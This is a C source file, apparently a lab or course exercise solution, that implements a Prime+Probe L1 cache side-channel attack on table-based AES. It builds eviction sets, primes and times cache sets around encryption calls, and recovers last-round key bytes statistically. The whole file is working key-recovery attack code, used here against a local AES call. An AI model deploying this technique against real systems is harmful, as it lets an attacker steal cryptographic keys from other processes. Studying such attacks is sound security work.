#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

#include "solution.h"
#include "../../material/AES/aes.h"

typedef struct node {
    struct node *next;
    uint8_t      padding[56];
} node_t;

static uint8_t *g_region      = NULL;
static size_t   g_region_size = 0;
static node_t  *g_sets[L1_SETS];

static const uint8_t AES_INV_SBOX[256] = {
    0x52,0x09,0x6a,0xd5,0x30,0x36,0xa5,0x38,0xbf,0x40,0xa3,0x9e,0x81,0xf3,0xd7,0xfb,
    0x7c,0xe3,0x39,0x82,0x9b,0x2f,0xff,0x87,0x34,0x8e,0x43,0x44,0xc4,0xde,0xe9,0xcb,
    0x54,0x7b,0x94,0x32,0xa6,0xc2,0x23,0x3d,0xee,0x4c,0x95,0x0b,0x42,0xfa,0xc3,0x4e,
    0x08,0x2e,0xa1,0x66,0x28,0xd9,0x24,0xb2,0x76,0x5b,0xa2,0x49,0x6d,0x8b,0xd1,0x25,
    0x72,0xf8,0xf6,0x64,0x86,0x68,0x98,0x16,0xd4,0xa4,0x5c,0xcc,0x5d,0x65,0xb6,0x92,
    0x6c,0x70,0x48,0x50,0xfd,0xed,0xb9,0xda,0x5e,0x15,0x46,0x57,0xa7,0x8d,0x9d,0x84,
    0x90,0xd8,0xab,0x00,0x8c,0xbc,0xd3,0x0a,0xf7,0xe4,0x58,0x05,0xb8,0xb3,0x45,0x06,
    0xd0,0x2c,0x1e,0x8f,0xca,0x3f,0x0f,0x02,0xc1,0xaf,0xbd,0x03,0x01,0x13,0x8a,0x6b,
    0x3a,0x91,0x11,0x41,0x4f,0x67,0xdc,0xea,0x97,0xf2,0xcf,0xce,0xf0,0xb4,0xe6,0x73,
    0x96,0xac,0x74,0x22,0xe7,0xad,0x35,0x85,0xe2,0xf9,0x37,0xe8,0x1c,0x75,0xdf,0x6e,
    0x47,0xf1,0x1a,0x71,0x1d,0x29,0xc5,0x89,0x6f,0xb7,0x62,0x0e,0xaa,0x18,0xbe,0x1b,
    0xfc,0x56,0x3e,0x4b,0xc6,0xd2,0x79,0x20,0x9a,0xdb,0xc0,0xfe,0x78,0xcd,0x5a,0xf4,
    0x1f,0xdd,0xa8,0x33,0x88,0x07,0xc7,0x31,0xb1,0x12,0x10,0x59,0x27,0x80,0xec,0x5f,
    0x60,0x51,0x7f,0xa9,0x19,0xb5,0x4a,0x0d,0x2d,0xe5,0x7a,0x9f,0x93,0xc9,0x9c,0xef,
    0xa0,0xe0,0x3b,0x4d,0xae,0x2a,0xf5,0xb0,0xc8,0xeb,0xbb,0x3c,0x83,0x53,0x99,0x61,
    0x17,0x2b,0x04,0x7e,0xba,0x77,0xd6,0x26,0xe1,0x69,0x14,0x63,0x55,0x21,0x0c,0x7d
};

static inline int l1_set_from_addr(void *addr) {
    uintptr_t a = (uintptr_t)addr;
    return (int)((a >> 6) & 0x3f);
}

static int init_eviction_sets(void) {
    if (g_region != NULL) {
        return 0;
    }

    g_region_size = 4 * 1024 * 1024;
    g_region = mmap(NULL, g_region_size,
                    PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS,
                    -1, 0);
    if (g_region == MAP_FAILED) {
        perror("mmap");
        g_region = NULL;
        return -1;
    }

    node_t *tmp[L1_SETS][L1_ASSOC];
    int counts[L1_SETS] = {0};

    for (size_t off = 0; off + L1_LINE <= g_region_size; off += L1_LINE) {
        node_t *n = (node_t *)(g_region + off);
        int set = l1_set_from_addr(n);
        if (set < 0 || set >= L1_SETS) {
            continue;
        }
        if (counts[set] < L1_ASSOC) {
            tmp[set][counts[set]++] = n;
        }
    }

    for (int s = 0; s < L1_SETS; s++) {
        if (counts[s] < L1_ASSOC) {
            fprintf(stderr, "Not enough lines for set %d\n", s);
            return -1;
        }
        for (int i = 0; i < L1_ASSOC; i++) {
            tmp[s][i]->next = tmp[s][(i + 1) % L1_ASSOC];
        }
        g_sets[s] = tmp[s][0];
    }

    return 0;
}

static void prime_all_sets(void) {
    for (int s = 0; s < L1_SETS; s++) {
        volatile node_t *p = g_sets[s];
        for (int i = 0; i < L1_ASSOC; i++) {
            p = p->next;
        }
    }
}

static void probe_all_sets(uint64_t *times_out) {
    for (int s = 0; s < L1_SETS; s++) {
        volatile node_t *p = g_sets[s];
        uint64_t start, end;

        asm volatile("lfence" ::: "memory");
        start = rdtsc64();
        for (int i = 0; i < L1_ASSOC; i++) {
            p = p->next;
        }
        end = rdtsc64();
        asm volatile("lfence" ::: "memory");

        times_out[s] = end - start;
    }
}

void task4_attack_last_round(int samples, const uint8_t key[16],
                             uint8_t out_k10[16]) {
    if (init_eviction_sets() != 0) {
        fprintf(stderr, "Failed to initialize eviction sets\n");
        return;
    }

    AES_KEY aeskey;
    if (private_AES_set_encrypt_key(key, 128, &aeskey) != 0) {
        fprintf(stderr, "private_AES_set_encrypt_key failed\n");
        return;
    }

    /* accum[byte][ciphertext][set] */
    static double   accum[16][256][L1_SETS];
    static uint32_t counts[16][256];

    memset(accum, 0, sizeof(accum));
    memset(counts, 0, sizeof(counts));

    uint8_t pt[16];
    uint8_t ct[16];
    uint64_t times[L1_SETS];

    for (int sample = 0; sample < samples; sample++) {
        for (int i = 0; i < 16; i++) {
            pt[i] = (uint8_t)(rand() & 0xff);
        }

        prime_all_sets();
        AES_encrypt(pt, ct, &aeskey);
        probe_all_sets(times);

        for (int j = 0; j < 16; j++) {
            uint8_t c = ct[j];
            counts[j][c]++;
            for (int s = 0; s < L1_SETS; s++) {
                accum[j][c][s] += (double)times[s];
            }
        }
    }

    /* Normalisation */
    double global_mean[16][L1_SETS];
    static double norm[16][256][L1_SETS];

    for (int j = 0; j < 16; j++) {
        for (int s = 0; s < L1_SETS; s++) {
            double sum = 0.0;
            uint32_t cnt = 0;
            for (int c = 0; c < 256; c++) {
                sum += accum[j][c][s];
                cnt += counts[j][c];
            }
            global_mean[j][s] = sum / (double)cnt;
        }
    }

    for (int j = 0; j < 16; j++) {
        for (int c = 0; c < 256; c++) {
            if (counts[j][c] == 0) {
                continue;
            }
            for (int s = 0; s < L1_SETS; s++) {
                double mean = accum[j][c][s] / (double)counts[j][c];
                norm[j][c][s] = mean - global_mean[j][s];
            }
        }
    }

    /* Scoring K10 bytes */
    for (int j = 0; j < 16; j++) {
        double best_score = -1e300;
        int best_k = 0;

        for (int k = 0; k < 256; k++) {
            for (int off = 0; off < L1_SETS; off++) {
                double sum = 0.0;

                for (int c = 0; c < 256; c++) {
                    if (!counts[j][c]) {
                        continue;
                    }
                    uint8_t x = AES_INV_SBOX[c ^ (uint8_t)k];
                    int line = x >> 4;
                    int set  = (off + line) & (L1_SETS - 1);
                    sum += norm[j][c][set];
                }

                if (sum > best_score) {
                    best_score = sum;
                    best_k = k;
                }
            }
        }

        out_k10[j] = (uint8_t)best_k;
    }
}
